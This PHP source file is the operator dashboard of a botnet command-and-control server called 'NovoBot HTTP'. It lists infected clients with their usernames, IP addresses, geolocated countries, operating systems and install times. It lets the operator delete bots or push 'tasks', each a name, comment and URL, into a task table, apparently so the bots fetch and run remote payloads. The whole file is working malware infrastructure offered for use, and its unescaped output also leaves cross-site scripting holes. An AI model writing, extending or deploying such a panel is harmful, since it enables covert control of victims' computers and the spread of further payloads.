<?php
session_start();
include "connection.php";

if (isset($_SESSION['user_session'])) {

	$token = $_SESSION['user_session'];

	$stmt = $conn -> prepare('SELECT * FROM bot_main WHERE user_token=:user_token');
	$stmt -> execute(array(':user_token' => $token));
	$userRow = $stmt -> fetch(PDO::FETCH_ASSOC);

	if ($stmt -> rowCount() <= 0) {
		header("Location: ./index.php");
		exit();
	}

} else {
	header("Location: ./index.php");
	exit();
}

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
	$output = NULL;
	if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
		$ip = $_SERVER["REMOTE_ADDR"];
		if ($deep_detect) {
			if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
				$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
			if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
				$ip = $_SERVER['HTTP_CLIENT_IP'];
		}
	}
	$purpose = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
	$support = array("country", "countrycode", "state", "region", "city", "location", "address");
	$continents = array("AF" => "Africa", "AN" => "Antarctica", "AS" => "Asia", "EU" => "Europe", "OC" => "Australia (Oceania)", "NA" => "North America", "SA" => "South America");
	if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
		$ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
		if (@strlen(trim($ipdat -> geoplugin_countryCode)) == 2) {
			switch ($purpose) {
				case "location" :
					$output = array("city" => @$ipdat -> geoplugin_city, "state" => @$ipdat -> geoplugin_regionName, "country" => @$ipdat -> geoplugin_countryName, "country_code" => @$ipdat -> geoplugin_countryCode, "continent" => @$continents[strtoupper($ipdat -> geoplugin_continentCode)], "continent_code" => @$ipdat -> geoplugin_continentCode);
					break;
				case "address" :
					$address = array($ipdat -> geoplugin_countryName);
					if (@strlen($ipdat -> geoplugin_regionName) >= 1)
						$address[] = $ipdat -> geoplugin_regionName;
					if (@strlen($ipdat -> geoplugin_city) >= 1)
						$address[] = $ipdat -> geoplugin_city;
					$output = implode(", ", array_reverse($address));
					break;
				case "city" :
					$output = @$ipdat -> geoplugin_city;
					break;
				case "state" :
					$output = @$ipdat -> geoplugin_regionName;
					break;
				case "region" :
					$output = @$ipdat -> geoplugin_regionName;
					break;
				case "country" :
					$output = @$ipdat -> geoplugin_countryName;
					break;
				case "countrycode" :
					$output = @$ipdat -> geoplugin_countryCode;
					break;
			}
		}
	}
	return $output;
}

if (isset($_POST['id']) && isset($_POST['type'])) {
	if ($_POST['type'] == "info") {
		
		$stmt = $conn->prepare("SELECT * FROM bot_client WHERE id=:id");
		$stmt->execute(array("id" => $_POST['id']));
		$clientRow = $stmt->fetch(PDO::FETCH_ASSOC);
		
		exit($clientRow['user_name']." (".$clientRow['ip_addr'].")");
	}

	if ($_POST['type'] == "del") {
		$stmt = $conn->prepare("DELETE FROM bot_client WHERE id=:id");
		$stmt->execute(array("id" => $_POST['id']));
		$clientRow = $stmt->fetch(PDO::FETCH_ASSOC);
		
		exit("OK");
	}
	
	if ($_POST['type'] == "task") {
		$stmt = $conn->prepare("INSERT INTO bot_tasks (name, comment, url) VALUES (:name, :comment, :url)");
		$stmt->execute(array("name" => $_POST['name'], "comment" => $_POST['comment'], "url" => $_POST['url']));
		
		exit("Task ". $_POST['name']. " added");
	}
}
?>
<!DOCTYPE html>
<html lang="en">
	<head>
		<meta charset="utf-8">
		<meta http-equiv="X-UA-Compatible" content="IE=edge">
		<meta name="viewport" content="width=device-width, initial-scale=1">
		<!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
		<title>Panel</title>

		<!-- Bootstrap -->
		<link href="css/bootstrap.min.css" rel="stylesheet">

		<style type="text/css">
			body {
				padding-top: 70px;
				background: #666;
			}
		</style>

		<!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
		<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
		<!--[if lt IE 9]>
		<script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
		<script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
		<![endif]-->
	</head>
	<body>

		<nav class="navbar navbar-default navbar-fixed-top">
			<div class="container">
				<div class="navbar-header">
					<button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
						<span class="sr-only">Toggle navigation</span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
						<span class="icon-bar"></span>
					</button>
					<a class="navbar-brand" href="#">NovoBot HTTP</a>
				</div>
				<div id="navbar" class="navbar-collapse collapse">
					<ul class="nav navbar-nav navbar-right">
						<li class="active">
							<a href="./panel.php">Panel</a>
						</li>
						<li>
							<a href="./task.php">Tasks</a>
						</li>
						<li>
							<a href="./settings.php">Settings</a>
						</li>
					</ul>
				</div><!--/.nav-collapse -->
			</div>
		</nav>

		<div class="container">

			<div class="panel panel-primary">
				<div class="panel-heading">
					Dashboard
				</div>
				<div class="panel-body" id="client-table">

					<table class="table table-bordered table-striped table-responsive" style="background: #fafafa;">
						<thead>
							<tr>
								<th>#</th>
								<th>Username</th>
								<th>IP Address</th>
								<th>Country</th>
								<th>Operating System</th>
								<th>Creation Date</th>
								<th>Options</th>
							</tr>
						</thead>
						<tbody>
							<?php
							$stmt = $conn -> query("SELECT * FROM bot_client");
							while ($clientRow = $stmt -> fetch(PDO::FETCH_ASSOC)) {
							?>
							<tr id="<?php echo $clientRow['id']; ?>">
								<td><?php echo $clientRow['id']; ?></td>
								<td><?php echo $clientRow['user_name']; ?></td>
								<td><?php echo $clientRow['ip_addr']; ?></td>
								<td><?php echo ip_info($clientRow['ip_addr'], "Country"); ?></td>
								<td><?php echo $clientRow['os_name']; ?></td>
								<td><?php echo $clientRow['install_time']; ?></td>
								<td>
								<button type="button" class="btn btn-warning btn-sm btn-task" data-toggle="modal" data-target="#modal-task">
									Task
								</button>
								<button type="button" class="btn btn-danger btn-sm btn-del" data-toggle="modal" data-target="#modal-del">
									Delete
								</button></td>
							</tr>
							<?php
							}
							?>
						</tbody>
					</table>

				</div>

			</div>


			<!-- Delete Modal -->
			<div id="modal-del" class="modal fade" role="dialog">
				<div class="modal-dialog">

					<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">
								&times;
							</button>
							<h4 class="modal-title" id="modal-del-header">Delete: Jhon (127.0.0.1)</h4>
						</div>
						<div class="modal-body">
							<input type="hidden" id="client-del-id" value="0" />
							<p>
								Are you sure you want to delete the client?
							</p>
						</div>
						<div class="modal-footer">
							<button type="button" class="btn btn-danger btn-del-confirm" data-dismiss="modal">
								Yes
							</button>
							<button type="button" class="btn btn-default" data-dismiss="modal">
								No
							</button>
						</div>
					</div>
				</div>
			</div>

			<!-- Task Modal -->
			<div id="modal-task" class="modal fade" role="dialog">
				<div class="modal-dialog">

					<!-- Modal content-->
					<div class="modal-content">
						<div class="modal-header">
							<button type="button" class="close" data-dismiss="modal">
								&times;
							</button>
							<h4 class="modal-title" id="modal-task-header">Add Task: Jhon (127.0.0.1)</h4>
						</div>
						<div class="modal-body">
							
							<input type="hidden" id="client-task-id" value="0" />
							
							<div class="form-group">
  								<label for="tsk-name">Task Name:</label>
								<input type="text" class="form-control" id="task-name">
							</div>

							<div class="form-group">
								<label for="tsk-comment">Extra Comments:</label>
								<textarea class="form-control" rows="5" id="task-comment"></textarea>
							</div>
							
							<div class="form-group">
  								<label for="tsk-url">Task Url:</label>
								<input type="url" class="form-control" id="task-url">
							</div>

						</div>
						<div class="modal-footer">
							<button type="button" class="btn btn-warning btn-task-confirm" data-dismiss="modal">
								Add Task
							</button>
						</div>
					</div>
				</div>
			</div>

			<!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
			<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
			<!-- Include all compiled plugins (below), or include individual files as needed -->
			<script src="js/bootstrap.min.js"></script>

			<script type="text/javascript">
				$(".btn-del").click(function() {
					var cid = $(this).closest("tr").attr("id");
					$.post("panel.php", {id: cid, type: "info"}, function(result) {
        				$("#modal-del-header").html("Delete: " + result);
        				$("#client-del-id").val(cid);
    				});
				});
				$(".btn-task").click(function() {
					var cid = $(this).closest("tr").attr("id");
					$.post("panel.php", {id: cid, type: "info"}, function(result) {
        				$("#modal-task-header").html("Add Task: " + result);
        				$("#client-task-id").val(cid);
    				});
				});
				
				$(".btn-del-confirm").click(function() {
					var cid = $("#client-del-id").val();
					$.post("panel.php", {id: $("#client-del-id").val(), type: "del"}, function(result) {
        				$("tr#"+cid).remove();
    				});
				});
				
				$(".btn-task-confirm").click(function() {
					
					if (!$('#task-name').val() || !$('#task-comment').val() || !$('#task-url').val()) {
						alert("Please try again");
					} else {
						var cid = $("#client-task-id").val();
						$.post("panel.php", {
							id: cid,
							name: $("#task-name").val(),
							comment: $("#task-comment").val(),
							url: $("#task-url").val(),
							type: "task"
						}, function(result) {
	        				alert(result);
	    				});
	    			}
				});
			</script>
	</body>
</html>